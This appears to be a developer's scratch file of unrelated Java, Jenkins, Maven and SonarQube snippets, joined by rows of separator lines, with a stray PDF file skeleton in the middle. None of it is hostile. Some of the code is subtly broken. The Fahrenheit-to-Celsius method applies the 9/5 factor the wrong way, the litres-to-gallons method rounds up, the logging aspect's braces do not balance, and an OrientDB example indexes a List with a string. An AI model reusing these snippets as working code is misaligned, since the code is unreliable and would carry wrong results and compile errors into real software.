Now annotate all your rest API methods which you want to log

@EnableLogging(actionType = ActionType.SOME_EMPLOYEE_ACTION)
@Override
public Response getEmployees(RequestDto req, final String param) {
...
}
Now on to the Aspect. component-scan the package which this class is in.

@Aspect
@Component
public class Aspects {

@AfterReturning(pointcut = "execution(@co.xyz.aspect.EnableLogging * *(..)) && @annotation(enableLogging) && args(reqArg, reqArg1,..)", returning = "result")
public void auditInfo(JoinPoint joinPoint, Object result, EnableLogging enableLogging, Object reqArg, String reqArg1) {

    HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes())
            .getRequest();

    if (result instanceof Response) {
        Response responseObj = (Response) result;

    String requestUrl = request.getScheme() + "://" + request.getServerName()
                + ":" + request.getServerPort() + request.getContextPath() + request.getRequestURI()
                + "?" + request.getQueryString();

String clientIp = request.getRemoteAddr();
String clientRequest = reqArg.toString();
int httpResponseStatus = responseObj.getStatus();
responseObj.getEntity();
// Can log whatever stuff from here in a single spot.
}


@AfterThrowing(pointcut = "execution(@co.xyz.aspect.EnableLogging * *(..)) && @annotation(enableLogging) && args(reqArg, reqArg1,..)", throwing="exception")
public void auditExceptionInfo(JoinPoint joinPoint, Throwable exception, EnableLogging enableLogging, Object reqArg, String reqArg1) {

    HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes())
            .getRequest();

    String requestUrl = request.getScheme() + "://" + request.getServerName()
    + ":" + request.getServerPort() + request.getContextPath() + request.getRequestURI()
    + "?" + request.getQueryString();

    exception.getMessage();
    exception.getCause();
    exception.printStackTrace();
    exception.getLocalizedMessage();
    // Can log whatever exceptions, requests, etc from here in a single spot.
    }
}
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
%PDF-1.2
% created by PIL PDF driver 0.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Count 1
/Kids [4 0 R]
>>
endobj
3 0 obj
<<
/Type /XObject
/Subtype /Image
/Width 2490
/Height 3510
/Length 723721
/Filter /DCTDecode
/BitsPerComponent 8
/ColorSpace /DeviceRGB
>>
stream
...
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/Resources <<
/ProcSet [ /PDF /ImageC ]
/XObject << /image 3 0 R >>
>>
/MediaBox [ 0 0 2490 3510 ]
/Contents 5 0 R
>>
endobj
5 0 obj
<<
/Length 35
>>
stream
q 2490 0 0 3510 0 0 cm /image Do Q

endstream
endobj
xref
0 6
0000000000 65535 f 
0000000041 00000 n 
0000000090 00000 n 
0000000147 00000 n 
0000724040 00000 n 
0000724202 00000 n 
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
724287
%%EOF
==============================================================================================================
/**
 * Converts between different types of units.
 */
public class ConversionCalculator {

    // constants for temperature conversion
    private static final double BASE_FAHRENHEIT = 32.0;
    private static final double CELSIUS_FAHRENHEIT_CONVERSION_FACTOR = 9.0/5.0;

    // constants for litre to gallons
    private static final double LITRE_TO_GALLON_MULTIPLIER = 0.264172;

    // constant to raise radius by when calculating a circle
    private static final double POWER_OF_RADIUS = 2.0;

    /**
     * Converts centigrade to fahrenheit.
     * @param celsiusTemperature to convert
     * @return fahrenheit temperature.
     */
    public Double celsiusToFahrenheit(Double celsiusTemperature) {
        return (celsiusTemperature * CELSIUS_FAHRENHEIT_CONVERSION_FACTOR) + BASE_FAHRENHEIT;
    }

    /**
     * Converts fahrenheit to centigrade
     * @param fahrenheitTemperature to convert
     * @return
     */
    public Double fahrenheitToCelsius(Double fahrenheitTemperature) {
        return (fahrenheitTemperature - BASE_FAHRENHEIT) * CELSIUS_FAHRENHEIT_CONVERSION_FACTOR;
    }

    /**
     * Converts a volume in litres to gallons.
     * @param litreVolume to convert
     * @return volume in gallons
     */
    public Double litresToGallons(Double litreVolume) {
        return Math.ceil(litreVolume * LITRE_TO_GALLON_MULTIPLIER);
    }

    /**
     * Converts a radius to the area of a circle
     * @param radius of the circle
     * @return area of the circle in the same unit
     */
    public Double radiusToAreaOfCircle(Double radius) {
        return Math.PI * Math.pow(radius, POWER_OF_RADIUS);

    }
}
==============================================================================================================
pipeline {
    agent any

    stages {
        stage('Build') {
            steps {
                //mvn '-Prelease clean install -DskipTests'
                mvn 'clean install -DskipTests'
            }
        }

        stage('Unit Test') {
            steps {
                //mvn '-Prelease test'
                mvn 'test'
            }
        }

        //stage('Integration Test') {
        //    steps {
        //        mvn 'verify -DskipUnitTests -Parq-wildfly-swarm '
        //    }
        //}
    }
    
    post {
        
        always {
            // Archive Unit and integration test results, if any
            junit allowEmptyResults: true,
                    testResults: '**/target/surefire-reports/TEST-*.xml, **/target/failsafe-reports/*.xml'
            mailIfStatusChanged env.EMAIL_RECIPIENTS
        }
        success {
             // Send Slack-notification if build succeeds
            slackSend (color: "good", message: "Build success\nBuild: ${env.JOB_NAME} #${env.BUILD_NUMBER}\nURL: ${env.BUILD_URL}")
        }
        unstable {
             // Send Slack-notification if build succeeds
            slackSend (color: "warning", message: "Build unstable\nBuild: ${env.JOB_NAME} #${env.BUILD_NUMBER}\nURL: ${env.BUILD_URL}")
        }
        failure {
            // Send Slack-notification if build fails
            slackSend (color: "danger", message: "Build failed\nBuild: ${env.JOB_NAME} #${env.BUILD_NUMBER}\nURL: ${env.BUILD_URL}") 
        }
    }
}

def mailIfStatusChanged(String recipients) {
    // Also send "back to normal" emails. Mailer seems to check build result, but SUCCESS is not set at this point.
    if (currentBuild.currentResult == 'SUCCESS') {
        currentBuild.result = 'SUCCESS'
    }
    step([$class: 'Mailer', recipients: recipients])
}

def mvn(def args) {
    def mvnHome = tool 'M3'
    def javaHome = tool 'JDK8'

    // Apache Maven related side notes:
    // --batch-mode : recommended in CI to inform maven to not run in interactive mode (less logs)
    // -V : strongly recommended in CI, will display the JDK and Maven versions in use.
    //      Very useful to be quickly sure the selected versions were the ones you think.
    // -U : force maven to update snapshots each time (default : once an hour, makes no sense in CI).
    // -Dsurefire.useFile=false : useful in CI. Displays test errors in the logs directly (instead of
    //                            having to crawl the workspace files to see the cause).

    // Advice: don't define M2_HOME in general. Maven will autodetect its root fine.
    // See also
    // https://github.com/jenkinsci/pipeline-examples/blob/master/pipeline-examples/maven-and-jdk-specific-version/mavenAndJdkSpecificVersion.groovy
    withEnv(["JAVA_HOME=${javaHome}", "PATH+MAVEN=${mvnHome}/bin:${env.JAVA_HOME}/bin"]) {
        sh "${mvnHome}/bin/mvn ${args} --batch-mode -V -U -e -Dsurefire.useFile=false"
    }
}
==============================================================================================================
 <dependency>
    <groupId>org.sonarsource.scanner.maven</groupId>
    <artifactId>sonar-maven-plugin</artifactId>
    <version>3.7.0.1746</version>
</dependency>

#!/usr/bin/env bash
# 
#
# Copyright (c) 2006-2019, Speedment, Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License"); You may not
# use this file except in compliance with the License. You may obtain a copy of
# the License at:
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations under
# the License.
#

docker run -d --name sonarqube -p 9000:9000 sonarqube
mvn sonar:sonar  -Dsonar.host.url=http://localhost:9000
==============================================================================================================
#Fail on any error
set -e

if [ $# -eq 0 ]
  then
    echo "Usage $0: version"
    exit 1
fi
VERSION=$1

mvn versions:set -DnewVersion="$VERSION"
RETURN_BODY="return \"$VERSION\";"
sed -i tmp "s/getImplementationVersion.*\}/getImplementationVersion() \{ $RETURN_BODY \}/g" runtime-parent/runtime-core/src/main/java/com/speedment/runtime/core/internal/component/InfoComponentImpl.java
rm runtime-parent/runtime-core/src/main/java/com/speedment/runtime/core/internal/component/InfoComponentImpl.javatmp


http://vmsk-tc-prm.paragon-software.com/project.html?projectId=Microservices_ParagonMicroservicesConfirmationLinkCallback
==============================================================================================================
        // given
        doReturn(Optional.of(this.getUserResponse())).when(this.registryClient).getUser(ArgumentMatchers.any(GetUserRequest.class));
==============================================================================================================
pactbroker:
  host: "your.broker.local"
  port: "443"
  protocol: "https"
  auth:
    username: "<your broker username>"
    password: "<your broker password>"
	
@RunWith(SpringRestPactRunner.class)
@Provider("My Service")
@PactBroker(
  authentication =  @PactBrokerAuth(username = "${pactbroker.auth.username}", password = "${pactbroker.auth.password}")
)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
public class PactVerificationTest {
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
 * OrientDB orientDb = new OrientDB("remote:localhost","root","root");
 * if(orientDb.createIfNotExists("test",ODatabaseType.MEMORY)){
 *  ODatabaseDocument session = orientDb.open("test","admin","admin");
 *  session.createClass("MyClass");
 *  session.close();
 * }
 * ODatabaseDocument session = orientDb.open("test","writer","writer");
 * //...
 * session.close();
 * orientDb.close();




* OrientDB orientDb = ...
 * if(!orientDb.exists("one")){
 *  orientDb.create("one",ODatabaseType.PLOCAL);
 * }
 * if(orientDb.exists("two")){
 *  orientDb.drop("two");
 * }
 * List&ltString&gt databases = orientDb.list();
 * assertEquals(databases.size(),1);
 * assertEquals(databases.get("0"),"one");


   * OrientDB orientDb = new OrientDB("remote:localhost");
   * ODatabaseDocument session = orientDb.open("test","admin","admin");
   * //...
   * session.close();
   * orientDb.close();
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
=======
mvn sonar:help -Ddetail=true -Dgoal=<goal-name> 


mvn sonar:sonar -Dsonar.host.url=http://localhost:9000 
  -Dsonar.login=the-generated-token
==============================================================================================================
@Configuration
class ApolloConfig {

    @Bean
    @Profile( "!test" )
    static ApolloClient.Builder prodClient( @Value( "${phdb.endpoint}" ) String graphqlEndpoint ) {
        return ApolloClient.builder().serverUrl( graphqlEndpoint );
    }

    @Bean
    @Profile( "test" )
    static ApolloClient.Builder testClient(@Value( "${local.server.port}" ) int port ) {
        return ApolloClient.builder();
    }
}

@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes = Application.class)
@WebAppConfiguration
@IntegrationTest({"server.port=0"})
public class CustomerControllerIT {
  
  @Value("${local.server.port}")
  private int port;
  private URL base;
  private RestTemplate template;
  @Autowired
  private DataBuilder dataBuilder;
  @Autowired
  private CustomerRepository customerRepository;
  private static final String JSON_CONTENT_TYPE = "application/json;charset=UTF-8";
  
  @RunWith(Cucumber.class)
@CucumberOptions(
 tags = {"@web"},
 glue = {
 "cucumber.runtime.java.spring.webappconfig",
 "cucumber.runtime.java.spring.dirtiescontextconfig",
 "com.robinelvin.rest.cucumber"
 },
 features = {"classpath:com/robinelvin/rest/cucumber/signup.feature"},
 plugin = {"pretty"})
public class RunCucumberTests {
}


https://docs.spring.io/spring-boot/docs/current/reference/html/spring-boot-features.html

spring.main.lazy-initialization=true

 public void onApplicationEvent(WebServerInitializedEvent event) { 
 	String propertyName = "local." + getName(event.getApplicationContext()) + ".port"; 
 	setPortProperty(event.getApplicationContext(), propertyName, 
 			event.getWebServer().getPort()); 
 } 
 
 StoryReporterBuilder builder = new StoryReporterBuilder() {
    public StoryReporter reporterFor(String storyPath, Format format) {
        switch (format) {
        case TXT:
            factory.useConfiguration(new FileConfiguration("text"));
            return new TxtOutput(factory.createPrintStream(), new Properties(), 
                                                new LocalizedKeywords(), true);                    
        default:
            return super.reporterFor(storyPath, format);
        }
    }
==============================================================================================================
/**
 * Run the client, pulling credentials from the environment.
 * Throws an IllegalStateException if the required environment variables aren't set.
 * These are:
 *
 * <ul>
 *   <li>CORENLP_HOST</li>
 *   <li>CORENLP_KEY</li>
 *   <li>CORENLP_SECRET</li>
 * </ul>
 *
 * @throws IllegalStateException Thrown if we could not read the required environment variables.
 */
@SuppressWarnings("unused")
public StanfordCoreNLPClient(Properties properties) throws IllegalStateException {
 this(properties,
   Optional.ofNullable(System.getenv("CORENLP_HOST")).orElseThrow(() -> new IllegalStateException("Environment variable CORENLP_HOST not specified")),
   Optional.ofNullable(System.getenv("CORENLP_HOST")).map(x -> x.startsWith("http://") ? 80 : 443).orElse(443),
   1,
   Optional.ofNullable(System.getenv("CORENLP_KEY")).orElse(null),
   Optional.ofNullable(System.getenv("CORENLP_SECRET")).orElse(null)
  );
}
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================